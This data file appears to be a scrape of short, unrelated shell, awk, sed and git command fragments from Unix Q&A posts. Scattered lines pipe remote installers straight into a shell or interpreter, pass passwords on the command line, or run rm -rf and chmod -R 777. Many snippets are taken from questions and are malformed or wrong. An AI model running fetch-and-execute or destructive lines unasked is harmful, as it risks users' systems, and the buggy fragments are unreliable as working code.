1 0
expr 1 + 2 3
bash script.sh
man 1 date
man date
vipw -s
userdel -rf username
export VISUAL=vim
crontab -e
echo $VISUAL
sed 's/[[:space:]]\+/+/g' f|bc
source .bashrc
. .bashrc
stdin: is not a tty
-lib src/calculator4
-o ../../gen/calculator4
grep -c string
grep -oP "wwn=[^,]*" path/to/file | sort | uniq -c
/string=/ {count[$2]++}
END {for (i in count) print i, count[i]}
[[ ]]
[ ]
[[ ]]
"uname -a"
set -x
[ssh $HOST "uname -a"]
foo arg1 arg2 arg3
time foo
sh -c
sh -c ...
grep "^Error/" Error.txt > Error1.txt
oslevel 6.1.0.0
Hello World
Hello World
echo -e
for ((i=1;i<=10;i++)) ; do echo -e "Hello World" >> testforloop.txt ;  done
cat testforloop.txt
cat -n testforloop.txt
(( ))
s#\(\w\+\) #...#
man re_format
awk '$1=="test2" {print $2}'
cut -d ' '
xm domid test2
mawk 1.3.3
GNU Awk 3.1.5
(x in array)
kill -9 xxx
if [ [$Temp > 42000] ]
grep -o "[0-9]*"
read "foo" "bar"
read <<< echo "text"
echo foo | catecho bar
echo foo | catecho bar
cat -
cat /dev/stdin
test -p
> /dev/tty
cut -d' ' -f1 -s
ls -R *.cpp
ls -lR mainfolder | grep fileextensiontobereported
ls -lR directory1 | grep .cpp
sed -e "4 s/Release_.*/Release_4_9/"
sed -e "4 s/Release_.*/Release_$RELEASE/"
type -P
ls -G
type -P ls
alias notfalse
type -P
ls -l ~/rsync_Windows_Backup
mysql ...
User: command not found
gpg --decrypt --input C:\PGPFiles\[encryptedfilename.pgp] --passphrase [yourpassphrase]
gpg --decrypt --input C:\PGPFiles\* --passphrase [yourpassphrase]
sh download.sh "test package" ~/
Subject = 'Your Report Data'
this pipe: | is my info!
this\ pipe\:\ \|\ is\ my\ info\!
-u critical
$ brew install zsh
$ sh -c "$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)"
source ~/.zshrc
$ cd ~/
chmod +x
awko data.txt
bundle install
./mykill.bash -l -s 33 abc gives $@='-l -s 33 abc'
GNU bash, version 3.2.48(1)-release-(x86_64-apple-darwin12)
sed -u 'p'
head -n 1
head -n 1
awk 'NR==n' myfile
trap 'kill $pid' EXIT
global masteron
Global masteroff
Global green
Global away
dataspecs old_val old stuff blah blah ! blah blah
dataspecs $new_val ! blah blah
string[1] //ONE, string[2] //TWO, string[3] //THREE
bash scripting
OUTxxx - 20130913.wav
qxxxx - 20130913.wav
xxxx- 20130913.wav
ps x |grep -v grep |grep -c CCcam
use autodie qw( system );
ssh user@host cat /etc/hosts
man bash
read -n 1 -p
read -n 1 -s
"Fri, 13 Sep 2013 17:16:45 GMT"
GNU date
date: illegal time format
LANG=C date
BEGIN { FS == /\s\s\s\s/ }
if ($2 = /[0-9]..../)
cd desktop
cd Desktop
echo this is digit 7 in a number | sed 's/digit \([0-9]\)/\1/'
shopt -s nullglob
sh script.sh
bash script.sh
find -mtime -1
-user $user
-x proxy:port
while read
./switch 0 0
./switch 0 0
cp -a
` `
tr -s '/'
date +%D
mkdir -p '$BACKUP_PATH'
mkdir -p "$BACKUP_PATH"
cp -r $SOURCE_PATH $BACKUP_PATH
grep --help
emacs $1
/Applications/Emacs.app/Contents/MacOS/Emacs "$1"
<td class="time">(\d{2}\.\d{2}\.\d{4}\s+\d{2}:\d{2})</td>
13.05.2013  17:51
[ -n $greet ]
[ -n $greet ]
[ -n ]
[ -n "$greet" ]
[[ $x ]]
[[ -n $x ]]
$ sudo setup.sh
source script.sh
sudo ./script.sh
sudo source ./script.sh
chmod +x script.sh
sudo cp ...
sudo -s
sudo -s
if …
while …
pushd .
cd `…`
readlink -f
SCRIPT_PATH="$(dirname $(readlink -f "${BASH_SOURCE[0]}"))"
if [ -h "$SCRIPT_PATH" ]
readlink $SCRIPT_PATH
echo "$SCRIPT_PATH"
chmod +x $R/bash/script_path.bash
cd $R/bash && ln -s script_path.bash link
cd $R
man [
man test
man test
bash script.sh
bash script.sh h logfile
send: spawn id exp7 not open
expect -f expect_file
$1 = '.-~'
$1 = '.-/~'
ulimit -S -s 10000
java com.myserver.Program "$@"
-e script
set -e
set -x
|| true
set -e
man -k "page_name" | awk -F'-' "/^page_name \(/ {print $1}"
| wc -l
man man
man -s man
man man
tail -f
wc -l
set -o vi
$ echo "set editing-mode vi" >> ~/.inputrc
aws-cli/1.0.0 Python/2.7.1 Darwin/11.4.2
find . -maxdepth 1 -type f ! -name unwanted.txt -exec tail -f {} +
man test
ls -l $(find. -name *.php -type f)
ls -l
ls -l $(find . -name *.php -type f) | awk '{s+=$5} END {print s}'
ls -l
/bin/bash --login
/bin/bash --login
1, 21, 41, ...
range(0, 256)
df -h|grep -iv filesystem |grep -o "[0-9]\+G"
sed -n '/^# LDAP Settings$/,/^$/p' oldfile > ldap.tmp
# LDAP Settings
(( ))
curl --head http://.... | grep ..| awk ..
NumberOne=$(grep -wc "port=51555" monitor.txt)
grep -c
eval value="\$$variable"
grep -c
trap 'continue' SIGINT
cat /logdir/my.log | grep "THIS IS THE LINE" | tail -1 | cut -f1,2,3 -d" "
$logdate2 + XXXSeconds
ls -a
top -bn 1
bash script.sh
awk '/Blah/{p=1}p;/Failed/{p=0}' file
awk '/Blah/,/Failed/' file
echo $file
echo $coinfile
nano ./coinfile.txt
ls -l
sudo su
echo {}
pdfgrep {}
#!/bin/bash -x
a && b && c && ...
 ~/desktop
 irb(main) 
 load 'personal_chef.rb' 
chmod +x summarise_accounts.sh
$(cat testfile)
while read
$(cat testfile)
(( ))
/tmp noexec
int getTempPath(char *buff)
static const char *envname[]
static const char *dirname[]
python ./waf configure --no-lsb build install
yum install python-devel -y
Python.h isn't found
--runtime-tmpdir PATH
make runall
case ans in
echo "runme.sh" | python /var/tmp/event.py
ls -l | more
stdbuf -i0 -e0 -o0 tail -f /var/tmp/event.log | python /var/tmp/event.py
num_root_files=$(list of files | cut -d'/' -f1 | uniq | wc -l)
[ $num_root_files -gt 1 ]
unrar --help
echo $1
cd /home/sth/remote
&& echo \"$1\"
bash -vx scriptname
kill $pid
man bash
mtime +30
tar czf archive-log.tar.gz $folder/*.log
-v rm="$rm"
NR%2{a=$0; next}
in case the line contains "Never", print the previous line (stored in
and the current one). Otherwise, print
if [ "_$str" = "_" ]
if [ "$str" = "" ]
for int Retries = 1 to 3
do shell script /blabla/git_credentials.sh
do shell script "$HOME/git_credentials.sh"
chmod +x /blabla/git_credentials.sh
chmod 755 /blabla/git_credentials.sh
OUT340-20130529-153516-1369856116.1254989.wav  q1064-20130508-234158-1368070917.885627.wav
if [ -z "string" ]
if [ ! -z $(find...) ]
git config
sudo easy_install Pygments
pygmentize script.sh
[ ]
[[ ]]
(( ))
LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/usr/local/lib ./myprog
sudo checkroot
sudo: checkroot: command not found
sudo -i checkroot
sh -n -v myScript.sh myGroup
case $var in (expr) ... ;; esac
vim -w/W and vim -s
vim -w test.keys input.file
:norm dd
:h ex-cmd-index
:help -s-ex
${cfg+-f "$cfg"}
-f "$cfg"
-f "$cfg"
seq 10
sort | uniq
sort -u
cat $file | wc -l
wc -l < $file
sort -u
wc -l
wc -l
which gawk
man find
-name foo.txt
expr substr 'abacaba' 3 6
[[ ]]
jobs -l
jobs -l
ps S
jobs -l
shell script
awk '{print "ibase=10;obase=2;" $1}' $1 | bc | xargs printf "%08d\n"
awk '{printf("0x%02x\n", $1)}' $1
[[ ]]
man bash
TZ=GMT-24 date +%Y%m%d
> filename
ps -ef | grep
ls -1t
Door ID
@.*login time: 20[0-9]
if [ -z "$2" ]; then
|| true
&& false
|| return 42
b t
#This is added automatically
0..9 a..z A..Z @ _
date +%H
" | "
screen -r
>(bash -c 'some stuff here')
ls -d */
ls -d
grep '\some_simple_string$' file | tail -n 1
awk '/\/some_simple_string/{x = $0}END{print x}'
tset -q
not a tty
tset -q
awk '$1~/^DocumentRoot/{print $2}' /etc/apache2/sites-available/default
sed -i
right truncation
MS SQL server 2008
right truncation
sleep X
echo "file already exists, continuining"
myCommand fileName | grep ExpectedResult
readelf -s | grep MySymbol
grep -H
(standard input)
sleep 1
man stdbuf
printf "%d" 0xFF
traverse "${1}/${file}"
11000000 00000000 00000000 00000000
int gpu = 1;
int gpu = 0;
| xargs -i date -d {} +%Y%m%d
xargs -i
sh script.sh
print os.getcwd()
# chkconfig: 2345 90 60
svn propget --revprop -rHEAD svn:date
svn info
svn log -r COMMITTED
grep -o
FOO=bar cmd
FOO=bar shell_func
FOO= aCommand
fetch test
FOO=bar shell_func
no input
any application
echo convert "$FILE" "$CPATH"
bash script.sh masterfolder convertedfolder
with cd("dir"), prefix("stuff")
man test
exec bash -l
find . -name "*.pdf" | tailx -1
tailx "$@"
["sh", "-c", "$cmd"]
mdadm --detail /dev/md0
command -v
env -i
make install
rm -rf ...
LESS=+/EXAMPLE: man parallel
check=$(cat switch)
check="$(cat switch)"
export check="$(cat switch)"
[[ $check = Running ]]
[ $check = Running ]
[[ … ]]
[[ … ]]
set -u
GNU sed
grep -oP
duration=$(($etime - $stime))
<nodevice id="EA10A1^M" seq=" " />
cat -v
sed -r
test.sh: 5: test.sh: Syntax error: "(" unexpected
/bin/sh -> /bin/dash
git filter-branch
giovanni\ azua
WARNING: Ref 'refs/heads/master' is unchanged
if [ "$GIT_AUTHOR_NAME" ~= "giovanni azua" ];
git filter-branch
no tty present
head -n -3
[[ ]]
[ ]
SELECT INTO OUTFILE
subprocess.check_call(["/home/user/bin/script.sh %s %s" % (subj,-6)],shell=True)
x = string.find('href="')
print string[x:y]
chmod -R 777 Adobe/
changing permissions of 'insert_directory_here': Permission denied
./testcpanel.sh: line 2: /usr/local/cpanel/cpanel: No such file or directory
2>&1 /dev/null
2>&1 /dev/null
./testcpanel.sh: line 2: /usr/local/cpanel/cpanel: No such file or directory
locale -a
man locale
locale -a
netstat -n
| grep tcp | awk '{ print $5 }' | cut -d "." -f-4
"2.10-11.el6_3.x86_64" < "2.10-9.el6.x86_64"
sort -VC
print $2+0,$0
git add
git rm
git add
git add webpage.html
cd "$(dirname "${BASH_SOURCE[0]}" )"
rename 'y/str1 - str2/str2 - str1/' *
target_dir_1, target_dir_2, target_dir_3
head -`expr \`wc -l < file\` - 2` file
echo $line | cut
[ $line =~ "keyValue" ]
{NR%2==1; print>o}
FNR == 1
NR % 2 == 1
NR % 2 == 1
NR % 2 == 1
file A, line 1
FNR == 1
NR % 2
file B, line 1
FNR == 1
NR % 2 == 1
2 % 2
== 1
FNR == 2
NR == 3
GNU awk
GNU sed
dataspecs  v1 v2 v3 v4 v5 ! blah
dataspecs  $new_val ! blah
dataspecs  v1 v2 v3 new_v4 new_v5 ! blah
< "in"
find -iname '/abc/*.txt' | xargs grep -e "ERROR1" -e "ERROR2"
find . -iname '*.txt'
find . -iname '/path/*.txt
find . -ipath '*/path/*.txt'
comm file.names matching.file.names
sleep 20s
sleep 20
sudo -S -p
find . -name '*.pdf'
1 2 3 4 5 6 7
1 2 3 4 5 6 7
Unexpected exception :
grep "Unexpected exception" output.txt | wc -l
i = 4
$1=Unexpected $2=exception $3=: $4=exception1
i = 2
day of month
man locale
find -readable
' Error
xargs: unmatched single quote; by default quotes are special to xargs unless you use the -0 option
xargs: argument line too long
' Error
xargs: argument line too long
line 5
line 10
echo $(date)
printf -v
printf -v
$[ ]
$(( ))
Illegal byte sequence
man locale
grep -l -r "products" Products/
echo $SHELL
nohup $SCRIPT &>/dev/null &
== --daemonize?
unzip -p some.docx word/document.xml | sed -e 's/<[^>]\{1,\}>//g; s/[^[:print:]]\{1,\}//g' | fold -w 80
sh /path/to/logparser.sh /path/to/big.log '2013-09-23T08:38' '2013-09-23T08:37' 'MySQL has gone away' 'Unhandled Error timed out'
buffer=$(eval $command)
buffer=$(tac $logfile | sed -n -e '/$minute/p' -e '/$minute_before/q')
-e '/$minute_before/q'
ps -ef r
curl -s ifconfig.me/all | column -t
awk '$2'
9.00 5.00 9.00
bash: ./program_name: permission denied
chmod u+x program_name
chmod u+x program_name
chmod u+x name
<CTRL> + <C>
wait $!
awk -f script.awk *.file.*
sed -n -e '/is up/ {;N;N;/is up.*[1-9].* 0 interface resets/p;}' *.file.*
| tee ~/.output
| tee ~/.output
yum list installed
b.sh -b b1option -B b2option -- -a1 a1option -a2 a2option
else if
git log --graph --all '--pretty=tformat:%h %Cred%d %Creset%s'
git checkout master; git reset --hard origin/master; git merge --no-ff hotfix-1.12
git reset --hard
git reset --hard origin/master
git cherry-pick
TOO LONG
/bin/bash: line 10: 60202 Terminated              ./analyze $f
/bin/bash: line 9: kill: (60241) - No such process
/bin/bash: line 9: kill: (60241) - No such process
echo $CLASSPATH
cd -
a = a || b
awk '{print "'hello'"}' filename
awk '{print "\'hello\'"}' filename
if [ "$P" = "SFTP" -a "$PORT" != "22" ] || [ "$P" = "FTPS" && [ "$PORT" != "990" -a "$PORT" != "21" ] ] ; then
if [ "$P" = "SFTP" ] && [ "$PORT" != "22" ]; then
system_profiler SPMemoryDataType
GNU awk
binding style="rp"
binding style="document"
echo -n
{gsub("\"","",$2); print $2}
set -u
-s "gil.sh 123
(-s gil.sh 123)
(-s "gil.sh 123")
./tmp.sh -s "gil.sh 123"
<(seq 1 10)
sh -c 'read line; echo "$line"'
tar -cf output_file.tar /path/to/installation
%windir%\sysnative\iexpress.exe //N C:\\git\\install_64bitWindows.SED
%windir%\system32\iexpress.exe //N C:\\git\\install_32bitWindows.SED
du -h /net/rcq-rp/job/rcq/vault/image/film /net/rcq-rp/job/rcq/film --max-depth=1 --block-size=GB *
size[$NF] += $1
sizes[dir] = val
sizes[dir] += val
sudo curl -L https://get.rvm.io | bash-s stable - autolibs = homebrew - rails
sudo rm -rf /etc/rvmrc /etc/profile.d/rvm.sh /usr/local/rvm
ps -ef
sh this.sh *_*.*
echo The host is down
info sed
-printf '%h\n'
ls -l
export NODE_ENV=localhost
chmod a+x
bash auto-unzip.sh
echo -n '<pre>'
mv: cannot stat 'list(1).txt': No such file or directory
mv {$i} ~/txt
mv [$i] ~/txt
cmake -G Xcode .....
grep -f
grep -ron -f needle *
sort --uniq filename -o temp1
sort temp1 -o temp2
uniq -u temp2 > temp3
sort --uniq
uniq -u
sleep 5
binascii.Error: Incorrect padding
subprocess.call(['/bin/bash', '/usr/local/src/sample.sh'])
print $0
man bash
<elementName xsi:nil="true" />
<elementName />
SHOW  data_directory;
-v var=val
-v variable=value
wc -l
grep -v "^removed directory"
prog1 | prog2 | prog3
| prog2 | prog3
<( )
git diff-index --cached ... HEAD
git diff ... --cached
git diff
bash -xl
set -v
set +v
bash -x
make clean
du -sh /path/*
lsof -i tcp:80 | awk '$1=="Google" {print $2}'
lsof -i tcp:80 | awk
$1=="Google" {print $2}
'lsof -i tcp:80 | awk'
'$1=="Google" {print $2}'
-p nullify
git remote add origin ssh://git@domain.com:<port>/<project name>
awk -F "|" '{print $2$4 >> $5 }'  source.txt
<element> blablabla </element>
cd $sitename
split -n
split -b=1M -d  file.txt file
split -b1m -d  file.txt file
split -b=1m -d  file.txt file --additional-suffix=.txt
/VAULT14/620100_V14/620054 VOL1620054
/VAULT14/620100_V14/620054 VOL1620541
chmod +x 2match
\($*\)\.o[ :]*
pgrep -o
grep -v
ctrl + d
chmod +x mybash.sh
chmod 0777 mybash.sh
ruby -e "$(curl -fsSL https://raw.github.com/mxcl/homebrew/go)
which curl
curl --version
chmod +x
chown root:root
#!/bin/bash -x
+ databaseName=$'ferdinel_db\r'
tr -d '"; '
if [ "$output" != "" ];
if [ $output != "" ];
if ( \
cmp -s file1 file2
curl https://remote.path/script.py | python
python script.py arg1 arg2 arg3
man python
ls $HOME
ls /home/user
busybox source code
{print $1,$4}
od -x
od -xC
modprobe binfmt_script
/ [0-9]/
-A AA/BB
-F"[\/ ]"
'{print $2$3}'
${AIRLINE_OPTION//-A /}
GNU bash, version 4.2.25(1)-release (x86_64-pc-linux-gnu)
COMMAND EXECUTION ENVIRONMENT
Control Panel
Advanced system settings
Environment variables
ambiguous redirects
tr -d
wc -l
[[ ... ]]
read -p
/dev/sdc2: LABEL="PAKAGE" UUID="9501DCBF768CEBB9" TYPE="ntfs"
f 'stringBuf*'
./index0-b-to-mb.sh '120928312 http://blah.com' MIXED
./index0-b-to-mb.sh '120928312 http://blah.com' BASE10
./index0-b-to-mb.sh '120928312 http://blah.com' BASE2
./index0-b-to-mb.sh '120928312 http://blah.com'
./index0-b-to-mb.sh "$(your_command)"
dig -x $IP
$( )
"grep PTR | cut -d ' ' -f 2 | grep google | cut -f 5"
"grep PTR | cut -d ' ' -f 2 | grep google | cut -f 5"
echo $output1
exec 2>/dev/null
Echo hello, me
ps -p
... && ... || ...
awk printf
ps -ef
grep http
CI_REPORTS=/some/directory rake -f some_rake_file raketask1 raketask2 --trace
send string to shell:
watch my-script.sh
man watch
quotation mark
# -*- coding: utf-8 -*-
(mp3splt -c('**!!***use .cue file***!!**') [cuefile.cue] [nonstopmix.mp3] ~for anyone interested, is in the Ubu repos~)
touch ~/.bash_profile
-bash: touch: No such file or directory.
awk '{$1=""}1'
$ A=5
$ export B="foo"
$ A="foo"
declare -x
amixer set command
syntatic sugar
[^ ][^ ]*
ps aux | grep "[7]000.conf"
myVar: Erractic Nonesense
myVar: Erractic Nonesense
$ ./myScript 123
1: 1
set +-x
find -exec
help test
help test
man bash
CONDITIONAL EXPRESSIONS
[ ... ]
[[ ... ]]
ls foo.test.txt
test -e
test -e
echo $Last_Name
find -perm
awk -v var=
awk -vvar=
awk '{print a,b,$0}' a="$var1" b="$var2" file
awk 'some code' FS=',' file1.txt FS=';' file2.ext
echo "input data" | awk 'BEGIN {print var}' var="${variable}"
Charles Duffy
execlp("echo", "echo", "asd", ">", "/dev/null", "2>&1;", "echo", "temp", NULL);
echo asd > /dev/null 2>&1; echo temp
eval "$1"
bash: /bin/myscript: permission denied
cd {arbitrary-file} && ls {arbitrary-file}
alias cdls='cd $@ && ls $@
function cdls () {  ls "$@" && eval cd "\"\$$#\"";}
sed -n '$='
sed -n '$='
echo -n
ls -l
export $SOME_VAR=Some_value_for_this_variable
set (SOME_OTHER_VAR "$ENV{SOME_VAR}/SUFFIX")
FNR != NR
dig +trace +additional
dig +trace +additional
dig +trace +additional
FNR == 3
ls -lad */ | grep 'r-x' | sort | uniq -c
tar --help | grep '-z'
tar --help | grep '-z'
rename: not enough arguments
\[ \]
PS1='\[ $(formattedGitBranch) \] '
echo -e
function formattedGitBranch { echo -e "\001\e[0;91m\002 ($_branch)"; }
PS1='$(formattedGitBranch) '
App Name
sed -e
tail -f /var/log/mail.log
command-one | vim - | command-two
git commit
rest | of | pipeline
${var+:} false
: false
END {}
chmod +x sumcols
function exec_cmd_with_child(\*params*\)
gmake SHELL="cmd"
ls | grep something
script arg1 arg2 arg3 ...
expect eof
set ip [gets stdin]
git l
bash -c
, $OUT
xxx, yyy,zzz
str=$(curl https://raw.github.com/toneworm/template-html5-sass/master/index.html)
sed -i 's/\[name\]/TEST/g' $first > index.html
<text, on one line, including numbers, letters and colons>
for i in {1..$Lastday}
2> /dev/null
ls $directory_/fallback_*
2> /dev/null
ls $directory_/fallback_* 2> /dev/null
ls $directory_/fallback_* 2> /dev/null
ls -1 /home/students/*o*
wc -l
echo $AbsolutePath
ls $AbsolutePath
ls 39/91/39910
'ls $AbsolutePath'
"ls $AbsolutePath"
' '
cat | command
id=$(cat | docker run -i -a stdin progrium/buildstep /bin/bash -c "mkdir -p /app && tar -xC /app")
cat > file
id=$(cat "$HOME/$APP/ENV" | docker run -i -a stdin $IMAGE /bin/bash -c "mkdir -p /app/.profile.d && cat > /app/.profile.d/app-env.sh")
cat | command
&& cat >file
man bash
$foo args
set -e
tr -s ''
return status
^[^[:space:]]+\ [^[:space:]]+\ [^[:space:]]+$
ssh -V
man file
test -f foo
[ -f foo ]
^#! .*/bash$
zfs list
grep -q
grep -q
man test
my file.pdf
combined.pdf "my file.pdf"
my file.pdf
"my file.pdf"
set +x
GNU Grep
GNU grep
grep -E
grep -P
GNU awk
" "
$( )
` `
wc -l
chan truncate
set -i size
apt-get install
yum install
yum install python-setuptools
wget https://bitbucket.org/pypa/setuptools/raw/bootstrap/ez_setup.py -O - | python
easy_install pip
echo "Time: $(date)" >> /path/to/Debug.log
Fri Sep  9 12:18:02 CEST 2016
10K + n, 0 < n < 5
10K + n, n > 5
./split.sh split_input
install foo dest
install foo dest
install -d foo dest
cp -r
{print $0}
column 2
git checkout
'completed successfully'
jobs -p
zmprov ca
zmprov $line
zmprov "$line"
<image_viewer> </image_viewer>
<image_thumb_url> </image_thumb_url>
rm -i
rm -rf
rm -i
rm -rf
alias rm = rm -i
find /volume2/Disk2 -type f \( -iname "*.avi" -o -iname "*.m*v" -o -iname "*.iso" -o -iname "*.mp*" \) | sort -do /tmp/$DATE-filmer.txt
eval "$command2"
comment out
cpuInfo=$(cat /proc/cpuinfo)
-f 1
-c 1
echo $(cat...)
cont=$(cat "$folder"/"$file")
man grep
word1 word2 word3
exec >log 2>&1
exec | log_f
exec >log 2>&1
chmod +x script.sh
./script.sh start
./script.sh stop
(export blah blah)
rails s
export FOO=bar; cd app1/directory; rails s ...; echo $! > pid1
kill $(cat pid1)
cat pid1
rdev stop
tail -1
cat foo.py | xargs -d EOF -I % python -c %
@import url("common.css");
egrep "^body" *css
grep -q "MY_PATTERN"
two:three:four:five:six seven:eight
mawk 1.3.3
cmdLine="$1 >/dev/null"
evil eval
$ gammu-detect
name = Phone on USB serial port HUAWEI_Technology HUAWEI_Mobile
$ ./bashfile.sh
sh ./sample.sh
bash ./sample.sh
chmod +x sample.sh
sh ./sample.sh
zip -r /student/class1.zip /student/class1/
if [ $lastUpdated = null?; then... else...
tail -f
4 -> /dev/pts/1
export wordcounts
while read
-type f
sshpass -p 'password' scp ...
cat external.sh
mv *.1stextension *.2ndextension
mv *.txt *.c
while read
-d $'\0'
$ pg_ctl -D /usr/local/var/postgres -l /usr/local/var/postgres/server.log start
-bash: /usr/local/bin/pg_ctl: No such file or directory
sudo -u postgres
ps -fu postgres
brew info postgresql
grep PATTERN filename
m % n
pactl set-sink-mute 0 0
amixer set Master unmute
adb shell ls -l | wc -l /sdcard/dcim/Camera
adb shell ls -l /sdcard/dcim/Camera
| wc -l
adb shell "ls -l | wc -l" /sdcard/dcim/Camera
adb shell "ls -l | wc -l"
adb push path/to/busybox-armv5 /data/local/tmp
adb shell chmod 755 /data/local/tmp/busybox-armv5
adb shell /data/local/tmp/busybox-armv5 --install .
adb shell pull /data/local/tmp/wc /my/destination
adb shell /path/to/wc /data/local/tmp/wc
adb shell chmod 755 /data/local/tmp/wc
adb shell "ls -l /sdcard/dcim/Camera | /data/local/tmp/wc -l"
[^ ]
|  &  ;  <  >  (  )  $  `  \  "  '  <space>  <tab>  <newline>
*   ?   [   #   ~   =   %
git blah ...
/bin/sh/ -c "..."
#while ...
#cat ...
#cat ...
if statements
for j=0 to ARRAY_SIZE
< <( )*
rvm version
rvm get head
rvm get head --auto-dotfiles
which -a <ruby|gem>
uniq --all-repeated=separate -w 32
cut -d' ' -f2 test.txt
-n 1
IFS=$(echo -e '\n')
IFS=$(echo -en '\n\b')
fooargs=$(history -p '!foo:*')
help history
cat sets.txt | while read line
. /root/.profile
perldoc -v %ENV
paste -d' ' Group.csv Users.csv
paste -d' ' Group.csv Users.csv > temp.csv
< temp.csv
eval $B
eval $(echo $B)
echo $(eval $B)
read A
man gcc | grep $'-O\n'
grep $'-O\n'
grep -- -O$
grep -e -O$
info gcc
col -b
man some_command | col -b | grep -A5 -- 'your_request'
man man | col -b | grep -A5 -- '-K'
man grep | col -b | grep -A5 -- '-e patt'
:set list
:set nolist
:set ff
Jan 01
Feb 02
"option requires an argument -- d"
your_script.sh -d -e
getopts d: ...
getopts :d: ...
script.sh -d foo
script.sh -d
echo "Successfully created the directory location
[: missing ]
help test
help [[
Using /home/dev/.rvm/gems/ruby-2.0.0-p247
echo $ip IS UP
echo $ip IS DOWN
grep abc Letters
ssh user@remote <command>
./perlscript.pl > logfile.log
$| = 1
python -V
Python 2.6
Python 3.2
mv *some-typeable-and-unique-substring* ...
fdisk -l
fdisk -l
FNR == 1
pkill -f xxx
hexdump -n 4 -s 0x11C myFile
000011c 00 00 8c d0
hexdump -n 4 -s 0x11C -e '"%x\n"' myFile
echo '\t'
printf '%s\n'
echo "Hello world"|tee -a myfile.log|wall
rename ' - ' '' *
man find
ps aux
( )
g++: error: unrecognized command line option '... '
eval g++ sample.cc -o sample (pkg-config gtkmm-3.0 --cflags --libs)
syntax error near unexpected token
cat title.txt data.txt > out.txt
echo "......." | wall
/bin/sed "s/$VALUE/$NEW/g"
<file name of script>.pid
AppleScript Editor
ip addr
git filter-branch
git filter-branch
git filter-branch
git rev-list
git rev-list
grep -c
i need to go through all these files an find is there an entry like 'BPR'
grep -o BPR {path}/* | wc -l
declare -ai
man bash
echo $'foo\0bar'
echo -e 'foo\0bar'
echo $bar
print "<" rec ">"
print rec
print $6
grep -z
<!--\n   to be removed bla bla bla bla bla bl............\n\n        removeee\n\n    to be removeddddd\n    -->
\n\n<row>\n        <column name="example"  value="1" ></column>\n    </row>\n</Table>\n
grep -v
tr -d
getent passwd USER
[[ ..]]
[ ...]
echo "Hey, the file exists!"
| bash
for FILE in *
set -x
Viele Grusse
printf \\017
time -l ...
sudo -i
procps-ng 3.3.12
sudo -i
#!/bin/bash -xv
edit Podfile
sed 's/./@/' <<<$'\xfc'
LC_CTYPE=C sed ...
invalid byte sequence
0xC3 0xA0
iconv -l
file --mime-encoding
iconv -l
svn ls
-o nospace
-o nospace
-o default
--error-exitcode=<number> [default: 0]
cat $course_name$end
wc -l < x.txt
find_date= stat -c %y $file | awk
` should be
> output.txt
> output.txt && mv output.txt input.txt
awk "... all that program ..."
name = whatever
set -m
kill 0
./foo.sh &
totalAmount=$(expr $totalAmout+$amount)
(( totalAmount += amount ))
remove line
cut out line
find . -name \*access.log.xz
grep -E
[[ ${#match} = $maxlen ]]
sudo command
sed ':a;N;$!ba;s/(\n{/({\n/g'
-v RS='\0'
/All Present/
shopt -s autocd
No such file or directory
bash virt_env/myproject/main/nightly.sh
No such file or directory
echo $MAINDIR
set -x
./myScript.sh whathaveyou
echo Doing something here! $DEBUG
-d @/path/to/file
-d @-
Rewrite a92e7d6bd57d523fdffa227bffdc76d7b9eb7c7a (1/5)tree filter failed
; true
prog1 && prog2
(( ))
otool -L
otool -L
otool -L
otool -L
Killed: 9
No such file or directory
Killed: 9
otool -L
otool -l
info bash --index-search=set
+' rather than
ssh-keygen -t rsa
ssh-copy-id -i /root/.ssh/id_rsa.pub user@destination_IP_address
string "Temp = " and "Hum = "
update.sh: 2: update.sh: Syntax error: word unexpected (expecting "do")
ncat --exec "./sendlines.sh" 192.168.1.10 5000
grep -P
ps aux
ps auxww
chsh -s /usr/local/bin/fish
exec fish
Redirect output to multiple files, copies standard input to standard output and also to any files given as arguments. This is useful when you want not only to send some data down a pipe, but also to save a copy.
<command> | tee <outputFile>
tail -f
tail -f
echo -n
man sort
catalina version
catalina stop
catalina start
mvn tomcat7:run
./batch.sh: line 7: groovy: command not found
all=( "${MENU_ENGRUSFRA[@]}" "${DASHBOARD_1[@]}")
" No such file or directory"
echo $RED_INSTANCE_NAME
: No such file or directory
bash: cd: yourdir: No such file or directory
git push
echo 2.0.0-p247 > .ruby-version
#!/usr/bin/env rvm 2.0 do ruby
sed -i
stat /proc/myprocesspid
ps -aux
md5 -r
084C 2A6E-195D-3B7F
008040C020A060E 0109050D030B070F0  088848C828A868E 8189858D838B878F8
048444C424A464E 4149454D434B474F4  0C8C4CCC2CAC6CE C1C9C5CDC3CBC7CFC
028242C222A262E 2129252D232B272F2  0A8A4ACA2AAA6AE A1A9A5ADA3ABA7AFA
068646C626A666E 6169656D636B676
0E8E4ECE2EAE6EE E1E9E5EDE3EBE7EFE
018141C121A161E 1119151D131B171F1
8949C929A969E 9199959D939B979F9
058545C525A565E 5159555D535B575F5  0D8D4DCD2DAD6DE D1D9D5DDD3DBD7DFD
038343C323A363E 3139353D333B373F3  0B8B4BCB2BAB6BE B1B9B5BDB3BBB7BFB
078747C727A767E 7179757D737B777F7  0F8F4FCF2FAF6FE F1F9F5FDF3FBF7FFF
bitwise XOR
1 | 2
0 | 3
PHP 5.4
print(1 == 0)
expr $(commandToCheck) = $(valueToCheckAgainst)
man popen
POSIX mode
shopt -s checkhash
kill -l
mysqldump mydatabase  |   head -1100   | tail -n 100  > output.txt
( mysqldump mydatabase  |   head -1100   | tail -n 100 ) > output.txt
< "$R2"
[[ ..]]
useradd: cannot lock /etc/passwd; try again later
ansible-vault encrypt /path/to/credential.yml
pip install passlib
redundant cat
sed 's:string-to-be-matched:string-to-be-replaced:g' file-to-be-edited
readlink -f ${ABC}/Test/Folder_2
"string one", "string two"
--include="/opt" --include="/opt/dir1"
FILTER RULES
wc -m
ESC[#;#H or ESC[#;#f
which mpirun2
time time
time time cmd
time time
| less -S
git diff
git diff
git diff
git diff
git diff
man stat
emacsclient -t -a ''
sshpass's ssh
which sshpass
ALT+A then d
man screen
sed 's=bundle/.*=bundle='
egrep -o
expr $(du -b wednesday | cut -f1) / $(du -b tuesday | cut -f1)
grep -P
man grep
$ ./myscript.sh
source myscript.sh
$ ./myscript.sh
$ ./myscript.sh
a[$1]=$2 FS $3;next
('$2 FS $3' in a)
ls /c/
ls /cygdrive/c
id -u -n
id -u
who am I
uid=usernumber(username) ...
uniq -c
iyear_init = 1989
iyear_init = (the value of i-1, which should be the variable "year")
echo $year
screen -S test -p 0 -X stuff $'top\n'
dirname $0
info coreutils
svn update
svn update
/bin/foo bar
int main(int argc, char *argv[])
grep -P
